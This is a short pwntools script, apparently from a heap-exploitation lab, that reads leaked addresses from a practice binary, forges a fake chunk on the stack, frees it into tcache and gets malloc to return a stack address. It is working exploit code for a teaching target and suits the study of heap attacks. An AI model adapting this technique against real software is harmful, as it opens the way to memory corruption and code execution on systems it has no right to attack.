#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    chunk_ptr = stack_ptr
    print(f"fake chunk ptr: {chunk_ptr:#x}")

    # first allocation to setup tcache struct per thread
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*]")

    # fake chunk
    fake_chunk = (
        pwn.p64(0x0) +      # prev size
        pwn.p64(0x71) +     # current size + P flag
        pwn.p64(0x0) +      # fd = NULL
        pwn.p64(0x0)        # key = NULL
    )

    # forge fake chunk in the stack
    p.sendline(f"write {chunk_ptr:#x} {len(fake_chunk):#x}".encode())
    p.sendline(fake_chunk)

    # free the fake allocation
    p.sendline(f"free {chunk_ptr+0x10:#x}".encode())

    # make malloc return the fake chunk from tcache
    p.clean()
    p.sendline(b"malloc 0x64")
    p.recvuntil(b"[*] ")
    ptr = int(p.recvline()[:-1], 16)
    input(f"done. malloc returned arbitrary address from the stack: {ptr:#x}")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)


if __name__ == "__main__":
    main()
